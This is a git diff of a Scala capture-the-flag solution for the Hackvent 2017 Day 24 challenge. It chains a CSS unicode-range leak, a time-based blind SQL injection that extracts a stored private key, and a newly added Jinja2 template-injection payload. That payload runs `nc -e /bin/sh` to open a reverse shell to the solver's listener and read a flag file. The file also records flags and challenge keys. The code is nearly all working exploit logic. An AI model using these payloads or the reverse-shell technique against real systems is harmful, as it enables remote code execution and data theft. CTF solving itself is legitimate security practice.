@@ -3,12 +3,16 @@ package hackvent2017
 import java.net.URLEncoder
 import java.nio.file.{Files, Paths}
 
+import org.apache.http.client.methods.HttpGet
+import org.apache.http.impl.client.HttpClients
+import tools.NetCat
+
 import scala.collection.mutable.ListBuffer
 import scala.sys.process._
 
 object Day24 {
 
-  // step 1: @font-face unicode-range exploit (@see http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
+  // stage 1: @font-face unicode-range exploit (@see http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
   // password: Christmas2017 => login => http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78
   def pwnCSS(): Unit = {
     val cssOriginal = Paths.get("hackvent2017/challenges/day24/files/styles-original.css")
@@ -37,8 +41,8 @@ object Day24 {
     }
   }
 
-  // step 2: SQLi on CSR `state` field (MySQL server)
-  // SELECT private_key FROM hv24_2.keystorage LIMIT 1 => http://challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
+  // stage 2: SQLi on CSR `state` field (MySQL server)
+  // `SELECT private_key FROM hv24_2.keystorage LIMIT 1` => http://challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
   private def pwnCSR(): Unit = {
     val idChars = ('a' to 'z') ++ ('0' to '9') :+ '$' :+ '_' // case insensitive
     val valueChars = ('a' to 'z') ++ ('A' to 'Z') ++ ('0' to '9') :+ '-' :+ '_' :+ ':' :+ '/' :+ '?' :+ '=' :+ '.' // case sensitive
@@ -47,7 +51,7 @@ object Day24 {
     /* -- database names extractor -- */
 
     def databaseNameStmtBuilder()(c: Char, pos: Int, offset: Int): String =
-      s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d";
+      s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d"
 
     def extractDatabaseNames(): Seq[String] = extractValues(databaseNameStmtBuilder(), idChars)
     def extractDatabaseName(offset: Int): Option[String] = extractValue(databaseNameStmtBuilder(), idChars, offset)
@@ -116,9 +120,9 @@ object Day24 {
       if (value.nonEmpty) Some(value.toString) else None
     }
 
-    def checkSQL(statement: String, sleep: Int) = time(() => generateCert(s"'OR($statement)OR'")) >= sleep
+    def checkSQL(statement: String, sleep: Int): Boolean = time(() => generateCert(s"'OR($statement)OR'")) >= sleep
 
-    def generateCert(state: String) = {
+    def generateCert(state: String): Unit = {
       val retcode = s"hackvent2017/challenges/day24/files/generate-cert.sh $state".!
       if (retcode != 0) throw new RuntimeException(s"Unexpected result code: $retcode")
     }
@@ -127,6 +131,29 @@ object Day24 {
     val table = "keystorage" // <-- extractTableNames(db): List(certificates, keystorage)
     val column = "private_key" // <-- extractColumnNames(db, table): List(private_key)
     val value = "challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw" // <-- extractColumnValue(db, table, column, 0)
+  }
+
+  // stage 3: SSTi Jinja2 template via URL path (@see https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
+  // spawn a reverse shell => execute `cat /home/flag` => HV17-7h1s-1sju-t4ra-nd0m-flag
+  def pwnJinja(ip: String, port: Int): Unit = {
+    def rce(command: String): Unit = {
+      val ssti = s"''.__class__.__mro__[1].__subclasses__()[37](['$command'],shell=True).communicate()"
+      val url = s"http://challenges.hackvent.hacking-lab.com:1089/product${urlencode(s"{{$ssti}}")}?key=W5zzcusgZty9CNgw"
+      HttpClients.createMinimal().execute(new HttpGet(url)).close()
+    }
+
+    val listener = NetCat.listen(port, nc => {
+      try {
+        nc.writeln("cat /home/flag")
+        print(nc.read)
+      } finally {
+        nc.close()
+      }
+    })
+
+    rce(s"nc -e /bin/sh $ip $port")
+
+    listener.await()
   }
 
 }
